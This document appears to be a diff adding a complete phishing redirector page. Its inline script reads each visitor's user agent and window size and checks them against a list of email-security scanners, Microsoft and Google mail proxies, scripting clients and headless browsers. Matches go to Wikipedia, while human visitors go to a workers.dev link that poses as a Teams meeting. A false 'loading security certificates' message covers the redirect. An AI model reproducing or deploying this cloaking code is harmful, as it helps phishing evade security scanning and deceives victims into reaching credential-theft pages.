@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying Connection...</title>
+    <!-- Strictly forbid security bots from indexing this routing script -->
+    <meta name="robots" content="noindex, nofollow, noarchive">
+
+    <script>
+        (function() {
+            // 1. CONFIGURE YOUR TARGETS
+            const TARGET_LINK = "https://teams-1128293.remote-video.workers.dev";
+            const SAFE_PAGE = "https://wikipedia.org"; // Where security crawlers are trapped
+
+            // 2. CAPTURE BROWSING PROFILE
+            const userAgent = (navigator.userAgent || navigator.vendor || window.opera).toLowerCase();
+            
+            // Headless mail bots often run checks with 0px views or invisible window hooks
+            const viewWidth = window.innerWidth || document.documentElement.clientWidth || 0;
+            const viewHeight = window.innerHeight || document.documentElement.clientHeight || 0;
+
+            // 3. EXPANDED BOT BLACKLIST (Including Enterprise Email & Office Scanners)
+            const botSignatures = [
+                // --- Social Media & Preview Cards ---
+                'bot', 'crawler', 'spider', 'facebookexternalhit', 'twitterbot', 
+                'discordbot', 'slackbot', 'whatsapp', 'telegrambot', 'linkedinbot',
+                
+                // --- Microsoft / Outlook Systems ---
+                'microsoft', 'office', 'outlook', 'exchange', 'msie', 'trident', 
+                'safelinks', 'lync', 'skype', 'word', 'excel', 'powerpoint',
+                
+                // --- Google Email / Cloud Proxies ---
+                'googleimageproxy', 'google-mta', 'googlebot', 'appengine',
+                
+                // --- Technical & Scripting Libraries used by security crawlers ---
+                'python', 'requests', 'curl', 'wget', 'http-client', 'go-http', 
+                'headless', 'puppeteer', 'selenium', 'playwright'
+            ];
+
+            // 4. DYNAMIC TRAFFIC FILTERING
+            const isBotUserAgent = botSignatures.some(signature => userAgent.includes(signature));
+            const isHeadlessOrHidden = (viewWidth === 0 || viewHeight === 0);
+
+            if (isBotUserAgent || isHeadlessOrHidden) {
+                // Silently isolate the email bot on the harmless white page/safe page
+                window.location.replace(SAFE_PAGE);
+            } else {
+                // Instantly pass real human traffic through to your destination
+                window.location.replace(TARGET_LINK);
+            }
+        })();
+    </script>
+    <style>
+        /* Neutral fallback interface if an email bot captures a layout snapshot */
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #ffffff; color: #444; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loading-frame { text-align: center; max-width: 400px; padding: 20px; }
+    </style>
+</head>
+<body>
+    <div class="loading-frame">
+        <p>Loading security certificates... Please wait a moment while we verify your secure session connection.</p>
+    </div>
+</body>
+</html>
